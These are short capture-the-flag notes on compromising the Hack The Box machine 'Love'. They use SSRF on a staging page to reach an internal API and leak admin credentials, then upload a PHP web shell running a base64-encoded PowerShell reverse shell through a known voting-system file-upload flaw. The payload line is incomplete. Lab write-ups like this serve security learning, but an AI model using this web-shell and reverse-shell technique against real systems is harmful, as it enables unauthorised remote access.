After enumerating through the love.htb domain we do not find much.

Doing a vhosts scan shows that there is `staging.love.htb`

There is a `demo` page that allows for SSRF, as it allows you to input a URL to scan.

We can have the machine make a request to itself via the API available at port 5000

We input `http://love:5000`  to make an API call to itself and it gives us a password dashboard

We now have creds:

```
admin:@LoveIsInTheAir!!!!
```


---

# sourcecodester voting system
We can see that this dashboard is running `sourcecodester voting system` and runnign a google search for vulnerabilities we find this:

https://www.exploit-db.com/exploits/49846

We can essentially upload a windows php reverse shell.

After some testing, we determined that we need to obfuscate the reverse shell via base64

We can get RCE with the `-e` flag (EncodedCommand) in powershell.

We use the powershell base64 encoded rev shell from revshells.com


First, create a Position, then create a candidate and upload a reverse shell as the profile pic



Payload:

```php
?php echo exec("powershell -e "); ?>

```
